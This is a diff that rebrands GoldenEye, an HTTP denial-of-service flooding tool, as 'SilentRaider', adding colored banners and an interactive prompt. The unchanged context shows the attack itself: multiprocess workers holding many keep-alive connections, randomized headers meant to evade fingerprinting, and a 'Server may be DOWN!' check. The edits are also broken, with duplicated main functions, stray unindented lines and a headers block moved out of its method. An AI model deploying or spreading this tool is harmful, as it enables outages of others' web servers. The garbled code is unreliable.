@@ -1,15 +1,5 @@
 #!/usr/bin/env python3
 
-import os
-
-# ANSI Colors
-RED = '\033[91m'
-GREEN = '\033[92m'
-BLUE = '\033[94m'
-CYAN = '\033[96m'
-RESET = '\033[0m'
-BOLD = '\033[1m'
-
 r"""
 $Id: $
 
@@ -38,6 +28,33 @@ THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
 BY USING THIS SOFTWARE.
 """
 
+import os
+import signal
+import sys
+import random
+import urllib.parse
+import http.client
+from multiprocessing import Process, Manager
+
+# ANSI Colors
+# ANSI Colors
+RED = '\033[91m'
+GREEN = '\033[92m'
+BLUE = '\033[94m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+YELLOW = '\033[93m'
+MAGENTA = '\033[95m'
+
+
+colors = [RED, GREEN, BLUE, CYAN, YELLOW, MAGENTA]
+
+def get_random_color():
+    return random.choice(colors)
+
+
+
 # Banner with colors
 BANNER = f"""
 {GREEN}{BOLD}   ███████╗██╗██╗     ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗██████╗ ███████╗██████╗
@@ -50,14 +67,24 @@ BANNER = f"""
               {CYAN}Tool: SilentRaider v1.0 by Shadow_Sadist{RESET}
 """
 
-def show_banner():
+def signal_handler(sig, frame):
+    print("\nExiting SilentRaider...")
+    sys.exit(0)
+
+
+signal.signal(signal.SIGINT, signal_handler)
+
+def main():
+    show_banner()
     # Display banner as a title at script start
     os.system("clear")  # Clears the terminal before showing the banner
     print(BANNER)
+print(f'{BLUE}SilentRaider v1.0 by Shadow_Sadist{RESET}')
 
 def main():
     show_banner()
     print(f"{BLUE}Starting attack in '{GREEN}SilentRaider{BLUE}' mode{RESET}")
+print(f'{BLUE}SilentRaider v1.0 by Shadow_Sadist{RESET}')
     # Rest of the code goes here to start connections or attacks...
 
 
@@ -160,7 +187,7 @@ class GoldenEye(object):
 
     def exit(self):
         self.stats()
-        print("Shutting down GoldenEye")
+        print(f"{RED}Shutting down SilentRaider{RESET}")
 
     def __del__(self):
         self.exit()
@@ -169,17 +196,17 @@ class GoldenEye(object):
 
         # Taunt!
         print()
-        print(GOLDENEYE_BANNER)
+        print(BANNER)
         print()
 
     # Do the fun!
     def fire(self):
 
         self.printHeader()
-        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))
+        print(f"{get_random_color()}Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.{RESET}".format(self.method, self.nr_workers, self.nr_sockets))
 
         if DEBUG:
-            print("Starting {0} concurrent workers".format(self.nr_workers))
+            print(f"{get_random_color()}Starting {0} concurrent workers{RESET}".format(self.nr_workers))
 
         # Start workers
         for i in range(int(self.nr_workers)):
@@ -193,11 +220,11 @@ class GoldenEye(object):
                 self.workersQueue.append(worker)
                 worker.start()
             except Exception:
-                error("Failed to start worker {0}".format(i))
+                error(f"{RED}Failed to start worker {0}{RESET}".format(i))
                 pass
 
         if DEBUG:
-            print("Initiating monitor")
+            print(f"{CYAN}Initiating monitor{RESET}")
         self.monitor()
 
     def stats(self):
@@ -205,10 +232,10 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print("{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
+                print(f"{GREEN}{0} SilentRaider strikes hit. ({1} Failed){RESET}".format(self.counter[0], self.counter[1]))
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print("\tServer may be DOWN!")
+                    print(f"{RED}\tServer may be DOWN!{RESET}")
 
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
@@ -227,11 +254,11 @@ class GoldenEye(object):
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print("CTRL+C received. Killing all workers")
+                print(f"{RED}CTRL+C received. Killing all workers{RESET}")
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print("Killing worker {0}".format(worker.name))
+                            print(f"{BLUE}Killing worker {0}{RESET}".format(worker.name))
                         #worker.terminate()
                         worker.stop()
                     except Exception:
@@ -323,7 +350,7 @@ class Striker(Process):
     def run(self):
 
         if DEBUG:
-            print("Starting worker {0}".format(self.name))
+            print(f"{get_random_color()}Starting worker {0}{RESET}".format(self.name))
 
         while self.runnable:
 
@@ -364,7 +391,7 @@ class Striker(Process):
                     pass # silently ignore
 
         if DEBUG:
-            print("Worker {0} completed run. Sleeping...".format(self.name))
+            print(f"{get_random_color()}Worker {0} completed run. Sleeping...{RESET}".format(self.name))
 
     def closeConnections(self):
         for conn in self.socks:
@@ -487,24 +514,28 @@ class Striker(Process):
         nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
         roundEncodings = acceptEncoding[:nrEncodings]
 
-        http_headers = {
-            'User-Agent': self.getUserAgent(),
-            'Cache-Control': noCache,
-            'Accept-Encoding': ', '.join(roundEncodings),
-            'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
-            'Host': self.host,
-        }
+    http_headers = {
+    'User-Agent': self.getUserAgent(), 
+    'Cache-Control': 'no-cache', 
+    'Accept-Encoding': ', '.join(roundEncodings),  
+    'Connection': 'keep-alive',
+    'Keep-Alive': str(random.randint(1, 1000)),  
+    'Host': self.host,  
+}
 
         # Randomly-added headers
         # These headers are optional and are
         # randomly sent thus making the
         # header count random and unfingerprintable
-        if random.randrange(2) == 0:
-            # Random accept-charset
-            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
-            random.shuffle(acceptCharset)
-            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))
+    if random.randrange(2) == 0:   
+        acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
+        random.shuffle(acceptCharset)
+        http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
+            acceptCharset[0], 
+            acceptCharset[1], 
+            round(random.random(), 1), 
+            round(random.random(), 1)
+        )
 
         if random.randrange(2) == 0:
             # Random Referer
@@ -525,7 +556,9 @@ class Striker(Process):
             # Random Cookie
             http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))
 
-        return http_headers
+def get_http_headers():  
+    
+    return http_headers  
 
     # Housekeeping
     def stop(self):
@@ -556,23 +589,24 @@ class Striker(Process):
 
 def usage():
     print()
-    print('-----------------------------------------------------------------------------------------------------------')
+    print(f'{RED}-----------------------------------------------------------------------------------------------------------{RESET}')
     print()
-    print(GOLDENEYE_BANNER)
+    print(f'{BLUE}SilentRaider v1.0 by Shadow_Sadist{RESET}')
     print()
-    print(' USAGE: ./SilentRaider.py <url> [OPTIONS]')
+    print(f'{BLUE}USAGE:{RESET}{RED}python3 SilentRaider.py <url> [OPTIONS]{RESET}')
     print()
-    print(' OPTIONS:')
-    print('\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
-    print('\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)')
-    print('\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
-    print('\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
-    print('\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
-    print('\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
-    print('\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
-    print('\t -h, --help\t\tShows this help')
-    print()
-    print('-----------------------------------------------------------------------------------------------------------')
+    print(f'{BLUE}OPTIONS:')
+    print(f'{BLUE}   _____________________________________________________________________________________________________')
+    print(f'{BLUE}  |{RESET}{RED}       Flag:{RESET}{BLUE}      |{RESET}{GREEN}                Description:{RESET}                     {BLUE}| {RESET}          {BOLD}Default:{RESET}            {BLUE}|{RESET}')
+    print(f'{BLUE}  |-------------------|-------------------------------------------------|-------------------------------|')
+    print(f'{BLUE}  | -u, --useragents  | File with user-agents to use                    | (default: randomly generated) |')
+    print(f'{BLUE}  | -w, --workers     | Number of concurrent workers                    | (default: {DEFAULT_WORKERS})  |')
+    print(f'{BLUE}  | -s, --sockets     | Number of concurrent sockets                    | (default: {DEFAULT_SOCKETS})  |')
+    print(f'{BLUE}  | -m, --method | HTTP Method to use \'get\' or \'post\'  or \'random\'| (default: get)                |')
+    print(f'{BLUE}  | -d, --debug       | Enable Debug Mode [more verbose output]         | (default: False)              |')
+    print(f'{BLUE}  | -n, --nosslcheck  | Do not verify SSL Certificate                   | (default: True)               |')
+    print(f'{BLUE}  | -h, --help        | Shows this help                                 |                               |')
+    print(f'{BLUE}  -------------------------------------------------------------------------------------------------------{RESET}')
 
 
 def error(msg):
@@ -662,3 +696,18 @@ def main():
 
 if __name__ == "__main__":
     main()
+    show_banner()  
+
+    while True:
+        try:
+            cmd = input("┌──[SilentRaider] \n└─⌈S⌋ ➔ ")
+            if cmd.lower() == "exit" or cmd.lower() == "quit":
+                print("\nExiting SilentRaider...")
+                break
+            elif cmd.lower() == "help":
+                usage()  
+            else:
+                print(f"{RED}Unknown command: {cmd}{RESET}")
+        except KeyboardInterrupt:
+            print("\nExiting SilentRaider...")
+            break
